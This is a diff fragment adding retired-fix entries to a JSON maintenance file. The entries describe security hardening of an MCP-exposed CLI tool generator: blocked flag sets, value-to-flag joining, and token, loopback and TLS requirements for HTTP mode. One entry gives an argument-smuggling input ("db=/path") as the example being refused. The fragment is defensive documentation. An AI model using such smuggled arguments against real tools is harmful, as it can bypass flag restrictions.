+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
